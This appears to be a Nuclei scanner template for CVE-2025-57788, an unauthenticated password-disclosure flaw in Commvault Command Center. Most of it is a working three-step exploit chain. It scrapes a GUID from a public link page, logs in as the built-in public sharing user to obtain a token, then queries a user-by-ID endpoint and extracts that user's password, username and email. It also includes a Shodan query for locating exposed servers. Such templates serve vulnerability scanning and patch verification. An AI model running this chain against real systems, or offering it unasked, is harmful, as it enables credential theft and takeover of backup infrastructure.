flow: http(1) && http(2) && http(3)
http:
- extractors:
  - group: 1
    internal: true
    name: guid
    part: body
    regex:
    - cv-gorkha\\":\\"(.*?)\\"
    type: regex
  matchers:
  - internal: true
    part: body
    type: word
    words:
    - cv-gorkha
  raw:
  - 'GET /commandcenter/publicLink.do HTTP/1.1

    Host: {{Hostname}}

    '
- extractors:
  - group: 1
    internal: true
    name: token
    part: body
    regex:
    - '"token":"(.*?)"'
    type: regex
  matchers:
  - condition: and
    internal: true
    part: body
    type: word
    words:
    - _+_PublicSharingUser_
    - Public Sharing User
    - token
  raw:
  - "POST /commandcenter/api/Login HTTP/1.1\nHost: {{Hostname}}\nAccept: application/json\n\
    Content-Type: application/json;charset=UTF-8\n\n{\n  \"username\": \"_+_PublicSharingUser_\"\
    ,\n  \"password\": \"{{base64(guid)}}\"\n}\n"
- extractors:
  - internal: true
    json:
    - .password?
    name: password
    part: body
    type: json
  - internal: true
    json:
    - .login?
    name: username
    part: body
    type: json
  - internal: true
    json:
    - .email?
    name: email
    part: body
    type: json
  - dsl:
    - '"username: " + username + " password:" + password + " email: " + email'
    type: dsl
  matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains_all(body, 'login','email','password','datePasswordSet')
    type: dsl
  raw:
  - 'GET /commandcenter/RestServlet/Database/GetUmUserById/1 HTTP/1.1

    Host: {{Hostname}}

    Accept: application/xml

    Authtoken: {{token}}

    '
id: CVE-2025-57788
info:
  author: DhiyaneshDK,iamnoooob,pdresearch,watchtowr
  description: 'An issue was discovered in Commvault before 11.36.60. A vulnerability
    in a known login mechanism allows unauthenticated attackers to execute API calls
    without requiring user credentials. RBAC helps limit the exposure but does not
    eliminate risk.

    '
  impact: 'Unauthenticated attackers can exploit the public sharing login mechanism
    to access API endpoints and retrieve sensitive user information including passwords.

    '
  metadata:
    max-request: 1
    shodan-query: http.favicon.hash:-542502280
    verified: true
  name: Commvault Unauthenticated Password Disclosure (WT-2025-0047)
  reference:
  - https://labs.watchtowr.com/guess-who-would-be-stupid-enough-to-rob-the-same-vault-twice-pre-auth-rce-chains-in-commvault/
  - https://documentation.commvault.com/securityadvisories/CV_2025_08_3.html
  remediation: 'Upgrade Commvault to version 11.36.60 or later that properly restricts
    API access and removes the vulnerable login mechanism.

    '
  severity: medium
  tags: cve,cve2025,commandcenter,commvault,unauth,vkev,vuln
